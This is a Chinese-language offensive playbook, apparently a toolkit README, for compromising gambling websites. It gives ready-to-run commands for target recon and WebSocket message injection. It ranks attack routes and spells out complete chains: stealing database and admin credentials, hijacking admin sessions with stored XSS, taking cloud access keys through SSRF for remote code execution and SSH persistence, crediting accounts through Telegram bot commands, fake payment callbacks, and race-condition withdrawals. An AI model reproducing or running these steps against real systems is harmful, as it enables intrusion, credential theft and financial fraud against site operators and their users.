## 零步骤：智能路由（任何新目标先跑这一条）

```bash
# 30 秒内拿到完整作战计划，工具已按优先级排好序
python3 炼蛊房/auto_campaign.py plan -d <目标域名>

# 如果已知后台地址（判断 IP 白名单更准）
python3 炼蛊房/auto_campaign.py plan -d <目标域名> --admin https://admin.<目标域名>/login

# 绑定案卷（输出写入 案卷/<案卷>/）
python3 炼蛊房/auto_campaign.py plan -d <目标域名> --case <案卷目录名>
```

`auto_campaign.py` 会自动：
- 识别 CDN/WAF/技术栈/功能模块
- 按特征激活对应工具（博彩站通常激活 15+ 个）
- 输出带完整命令的 5 阶段作战计划
- 存储指纹 JSON 供后续分析

**如果不想自己判断用哪个工具，直接跑上面这条命令即可。**

## 总览：博彩站的攻击面优先级

```
★★★ 最高价值（快速拿 Admin）
  1. CF 备份文件（.bak/.swp/.git）   → cf_backup_bypass.py
  2. 测试/预发布子域（绕过 CF）       → test_subdomain_enum.py
  3. TG Bot 管理指令                 → tg_cmd_enum.py
  4. 非标准端口 Admin（CF 不代理）    → port_admin_scan.py

★★ 高价值（需要有效 token 或更多步骤）
  5. 存储型 XSS → Admin Cookie       → stored_xss_probe.py
  6. SSRF → 云主机 Metadata → AK/SK  → ssrf_probe.py
  7. Actuator heapdump → 阿里云 AK   → 炼蛊房/actuator_probe.py
  8. APK 逆向 → 硬编码 API key        → 炼蛊房/apk_recon.py

★ 中等价值（需要账号 / 深度利用）
  9. WebSocket 未授权订阅             → ws_probe.py
  10. 业务逻辑（并发超提/负数充值）    → logic_vuln_probe.py
  11. 代理商账号体系越权               → 炼蛊房/agent_probe.py
  12. 假支付回调                      → 杀招/秦百胜·回响
  13. gRPC 未鉴权接口                 → 炼蛊房/grpc_probe.py
```

## Phase 3：获得普通账号后的后续攻击

### 3.1 WebSocket 游戏消息
```bash
pip3 install websocket-client

# 发现所有 WS 端点
python3 炼蛊房/ws_probe.py scan \
  --base wss://target.com --token <token> --case <案卷>

# 持续监听（捕获游戏结算 settle 消息）
python3 炼蛊房/ws_probe.py listen \
  --url wss://target.com/ws --token <token> --duration 120 --case <案卷>

# 消息注入（越权订阅 / 房间操控）
python3 炼蛊房/ws_probe.py inject \
  --url wss://target.com/ws \
  --msg '{"type":"subscribe","roomId":"admin_room"}' \
  --token <token> --case <案卷>
```


## 典型成功路径

```
路径 A（最常见）：
  test_subdomain → 发现 dev.target.com（直连）
  → cf_backup_bypass → 拿到 config.php（数据库密码）
  → 直接登 phpMyAdmin 或 MySQL
  → dump 用户表 + admin 密码

路径 B（TG Bot）：
  apk_recon → 提取 TG Bot Token
  → tg_cmd_enum probe → /addbalance → 账户加款
  → 提现出金

路径 C（存储 XSS）：
  注册账号 → 在客服消息中注入 XSS
  → admin 打开消息列表 → JS 执行
  → 拿到 admin JWT → 完全接管

路径 D（SSRF 云主机）：
  发现头像上传 URL 参数
  → ssrf_probe → 命中阿里云 metadata
  → 获取 RAM AK/SK → RunCommand → RCE
  → 上传 SSH 公钥 → 持久化

路径 E（并发超提）：
  注册账号 → 通过假支付充值少量余额
  → logic_vuln_probe concurrent 30线程同时提现
  → race condition → 实际提现 30x 余额
```
